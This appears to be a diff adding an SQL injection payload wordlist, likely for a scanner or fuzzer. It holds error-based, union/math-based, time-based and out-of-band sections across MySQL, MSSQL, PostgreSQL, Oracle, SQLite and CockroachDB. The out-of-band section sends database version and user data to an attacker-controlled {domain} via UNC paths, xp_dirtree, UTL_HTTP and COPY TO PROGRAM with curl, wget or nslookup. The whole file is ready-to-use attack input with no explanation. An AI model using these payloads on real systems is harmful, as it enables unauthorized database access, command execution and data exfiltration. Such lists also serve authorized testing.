@@ -1,0 +1,211 @@
+##SQLi - Error-Based##
+'AND 1=CAST(0x41 AS int)--
+"AND 1=CAST(0x41 AS int)--
+')AND 1=CAST(0x41 AS int)--
+'))AND 1=CAST(0x41 AS int)--
+*/AND 1=CAST(0x41 AS int)--
+'AND 1=CONVERT(int,@@version)--
+"AND 1=CONVERT(int,@@version)--
+')AND 1=CONVERT(int,@@version)--
+1 AND 1=CONVERT(int,@@version)--
+'AND extractvalue(1,concat(0x7e,version()))#
+"AND extractvalue(1,concat(0x7e,version()))#
+')AND extractvalue(1,concat(0x7e,version()))#
+'))AND extractvalue(1,concat(0x7e,version()))#
+*/AND extractvalue(1,concat(0x7e,version()))#
+'AND updatexml(1,concat(0x7e,version()),1)#
+"AND updatexml(1,concat(0x7e,version()),1)#
+')AND updatexml(1,concat(0x7e,version()),1)#
+1 AND updatexml(1,concat(0x7e,version()),1)#
+'AND exp(~(SELECT*FROM(SELECT version())a))#
+"AND exp(~(SELECT*FROM(SELECT version())a))#
+')AND exp(~(SELECT*FROM(SELECT version())a))#
+'AND 1=CAST((SELECT version()) AS int)--
+"AND 1=CAST((SELECT version()) AS int)--
+')AND 1=CAST((SELECT version()) AS int)--
+1 AND 1=CAST((SELECT version()) AS int)--
+'AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+"AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--
+'AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)#
+"AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)#
+')AND ROW(1,1)>(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x)#
+'AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#
+"AND(SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)#
+'AND GTID_SUBSET(version(),1)#
+'OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)#
+"OR 1 GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)#
+'AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(version())) USING utf8)))#
+1 AND extractvalue(1,concat(0x7e,(SELECT version())))--
+1 AND updatexml(1,concat(0x7e,(SELECT version())),1)--
+'AND 1=CAST(version() AS numeric)--
+"AND 1=CAST(version() AS numeric)--
+')AND 1=CAST(version() AS numeric)--
+'||(SELECT ''||DBMS_UTILITY.SQLID_TO_SQLHASH('a') FROM dual)||'
+"OR 1=TO_NUMBER('a')--
+'OR 1=UTL_INADDR.GET_HOST_NAME('invalid')--
+'AND 1=CTXSYS.DRITHSX.SN(1,'a')--
+'OR 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH('a','a','a')--
+##SQLi - Math-Based (Canary: 1337)##
+'UNION SELECT 7*191--
+'UNION SELECT 7*191#
+"UNION SELECT 7*191--
+)UNION SELECT 7*191--
+'))UNION SELECT 7*191--
+'UNION SELECT 7*191,NULL--
+'UNION SELECT NULL,7*191--
+"UNION SELECT 7*191,NULL--
+'UNION SELECT 7*191,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL--
+'UNION SELECT NULL,NULL,7*191--
+'UNION SELECT 7*191,NULL,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL,NULL--
+'UNION SELECT NULL,NULL,7*191,NULL--
+'UNION SELECT NULL,NULL,NULL,7*191--
+'UNION SELECT 7*191,NULL,NULL,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL,NULL,NULL--
+'UNION SELECT 7*191,NULL,NULL,NULL,NULL,NULL--
+'UNION SELECT NULL,7*191,NULL,NULL,NULL,NULL--
+'AND 1=(SELECT 7*191)--
+"AND 1=(SELECT 7*191)--
+')AND 1=(SELECT 7*191)--
+'OR 7*191=1337--
+"OR 7*191=1337--
+')OR 7*191=1337--
+'AND 7*191=1337 AND '1'='1
+"AND 7*191=1337 AND "1"="1
+')AND 7*191=1337 AND ('1'='1
+'))AND 7*191=1337 AND (('1'='1
+*/AND 7*191=1337--
+'UNION ALL SELECT 7331/1--
+'UNION ALL SELECT 7331/1,NULL--
+'UNION ALL SELECT NULL,7331/1--
+##SQLi - Timing-Based##
+'OR SLEEP(5)#
+"OR SLEEP(5)#
+')OR SLEEP(5)#
+'))OR SLEEP(5)#
+*/OR SLEEP(5)#
+1 OR SLEEP(5)#
+'AND SLEEP(5)#
+"AND SLEEP(5)#
+'AND SLEEP(5) AND '1'='1
+"AND SLEEP(5) AND "1"="1
+'OR BENCHMARK(5000000,SHA1('a'))#
+"OR BENCHMARK(5000000,SHA1('a'))#
+')OR BENCHMARK(5000000,SHA1('a'))#
+1 OR BENCHMARK(5000000,SHA1('a'))#
+'AND IF(1=1,SLEEP(5),0)#
+"AND IF(1=1,SLEEP(5),0)#
+')AND IF(1=1,SLEEP(5),0)#
+1 AND IF(1=1,SLEEP(5),0)#
+'XOR(IF(1=1,SLEEP(5),0))XOR'Z
+"XOR(IF(1=1,SLEEP(5),0))XOR"Z
+0'XOR(IF(1=1,SLEEP(5),0))XOR'Z
+(SELECT(0)FROM(SELECT(SLEEP(5)))v)/*'+(SELECT(0)FROM(SELECT(SLEEP(5)))v)+'"+(SELECT(0)FROM(SELECT(SLEEP(5)))v)+"*/
+';WAITFOR DELAY '0:0:5'--
+";WAITFOR DELAY '0:0:5'--
+');WAITFOR DELAY '0:0:5'--
+'));WAITFOR DELAY '0:0:5'--
+*/;WAITFOR DELAY '0:0:5'--
+1;WAITFOR DELAY '0:0:5'--
+1);WAITFOR DELAY '0:0:5'--
+'AND 1=(SELECT 1 FROM(SELECT WAITFOR DELAY '0:0:5')a)--
+"AND 1=(SELECT 1 FROM(SELECT WAITFOR DELAY '0:0:5')a)--
+')AND 1=(SELECT 1 FROM(SELECT WAITFOR DELAY '0:0:5')a)--
+'OR 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:5')--
+"OR 1=(SELECT 1 WHERE 1=1 WAITFOR DELAY '0:0:5')--
+';IF(1=1) WAITFOR DELAY '0:0:5'--
+";IF(1=1) WAITFOR DELAY '0:0:5'--
+');IF(1=1) WAITFOR DELAY '0:0:5'--
+1;IF(1=1) WAITFOR DELAY '0:0:5'--
+'OR(SELECT pg_sleep(5))::text='1
+"OR(SELECT pg_sleep(5))::text="1
+')OR(SELECT pg_sleep(5))IS NOT NULL--
+'))OR(SELECT pg_sleep(5))IS NOT NULL--
+*/OR(SELECT pg_sleep(5))IS NOT NULL--
+1 OR(SELECT pg_sleep(5))IS NOT NULL--
+'AND(SELECT pg_sleep(5))IS NOT NULL--
+"AND(SELECT pg_sleep(5))IS NOT NULL--
+'AND(SELECT pg_sleep(5))IS NOT NULL AND '1'='1
+';SELECT pg_sleep(5)--
+";SELECT pg_sleep(5)--
+');SELECT pg_sleep(5)--
+1;SELECT pg_sleep(5)--
+'||(SELECT pg_sleep(5))||'
+'AND 1=(SELECT CASE WHEN 1=1 THEN(SELECT pg_sleep(5)) ELSE 1 END)--
+"AND 1=(SELECT CASE WHEN 1=1 THEN(SELECT pg_sleep(5)) ELSE 1 END)--
+'AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+"AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+')AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+'OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+"OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
+'AND 1=DBMS_LOCK.SLEEP(5)--
+"AND 1=DBMS_LOCK.SLEEP(5)--
+')AND 1=DBMS_LOCK.SLEEP(5)--
+1 AND 1=DBMS_LOCK.SLEEP(5)--
+'||DBMS_PIPE.RECEIVE_MESSAGE('a',5)||'
+'AND 1=(SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM dual)--
+'AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+"AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+')AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+1 AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--
+'OR RANDOMBLOB(500000000/2)--
+"OR RANDOMBLOB(500000000/2)--
+SLEEP(5)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+IF(1=1,SLEEP(5),0)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+(SELECT(0)FROM(SELECT(SLEEP(5)))v)/*'XOR(IF(1=1,SLEEP(5),0))OR'"XOR(IF(1=1,SLEEP(5),0))OR"*/
+SLEEP(5)/*'OR SLEEP(5) OR'"OR SLEEP(5) OR"*/
+1 AND(SELECT 1 FROM(SELECT SLEEP(5))a)/*'AND(SELECT 1 FROM(SELECT SLEEP(5))a) AND'1'='1"AND(SELECT 1 FROM(SELECT SLEEP(5))a) AND"1"="1*/
+'AND(SELECT CASE WHEN(1=1)THEN SLEEP(5) ELSE 1 END)/*"AND(SELECT CASE WHEN(1=1)THEN SLEEP(5) ELSE 1 END)*/--
+0'XOR(if(now()=sysdate(),SLEEP(5),0))XOR'Z/*"XOR(if(now()=sysdate(),SLEEP(5),0))XOR"Z*/
+##SQLi - OOB (Out-of-Band)##
+'AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+"AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+')AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+1 AND LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+'UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+'UNION SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a')),NULL#
+'AND(SELECT LOAD_FILE(CONCAT('\\\\',(SELECT version()),'.{domain}\\a')))#
+';SELECT LOAD_FILE(CONCAT('\\\\',version(),'.{domain}\\a'))#
+';EXEC master..xp_dirtree '\\{domain}\a'--
+";EXEC master..xp_dirtree '\\{domain}\a'--
+');EXEC master..xp_dirtree '\\{domain}\a'--
+1;EXEC master..xp_dirtree '\\{domain}\a'--
+';EXEC master..xp_dirtree '\\'+@@version+'.{domain}\a'--
+";EXEC master..xp_dirtree '\\'+@@version+'.{domain}\a'--
+';EXEC master..xp_fileexist '\\{domain}\a'--
+";EXEC master..xp_fileexist '\\{domain}\a'--
+';DECLARE @q VARCHAR(1024);SET @q='\\'+@@version+'.{domain}\a';EXEC master..xp_dirtree @q--
+1;DECLARE @q VARCHAR(1024);SET @q='\\'+@@version+'.{domain}\a';EXEC master..xp_dirtree @q--
+';COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+";COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+');COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+1;COPY (SELECT version()) TO PROGRAM 'nslookup {domain}'--
+';SELECT dblink_connect('host={domain} user=a password=a dbname=a')--
+";SELECT dblink_connect('host={domain} user=a password=a dbname=a')--
+';COPY (SELECT '') TO PROGRAM 'curl http://{domain}/'--
+';COPY (SELECT '') TO PROGRAM 'wget http://{domain}/'--
+'AND 1=UTL_HTTP.REQUEST('http://{domain}/'||version)--
+"AND 1=UTL_HTTP.REQUEST('http://{domain}/'||version)--
+')AND 1=UTL_HTTP.REQUEST('http://{domain}/'||version)--
+1 AND 1=UTL_HTTP.REQUEST('http://{domain}/')--
+'OR 1=UTL_INADDR.GET_HOST_ADDRESS('{domain}')--
+"OR 1=UTL_INADDR.GET_HOST_ADDRESS('{domain}')--
+'AND 1=HTTPURITYPE('http://{domain}/').GETCLOB()--
+"AND 1=HTTPURITYPE('http://{domain}/').GETCLOB()--
+'||(SELECT UTL_HTTP.REQUEST('http://{domain}/'||user) FROM dual)||'
+'||(SELECT HTTPURITYPE('http://{domain}/').GETCLOB() FROM dual)||'
+';SELECT UTL_HTTP.REQUEST('http://{domain}/') FROM dual--
+##PostgreSQL Error-Based##
+' AND 1=CAST(version() AS int)--
+' AND 1=CAST(current_database() AS int)--
+' AND 1=CAST(current_user AS int)--
+') AND 1=CAST(version() AS int)--
+##SQLite Error-Based##
+' AND 1=invalidfunc()--
+' AND 1=CAST('abc' AS INTEGER)--
+' AND typeof(invalid_col)--
+##CockroachDB Time-Based##
+' AND pg_sleep(5) IS NOT NULL--
+1;SELECT pg_sleep(5)--
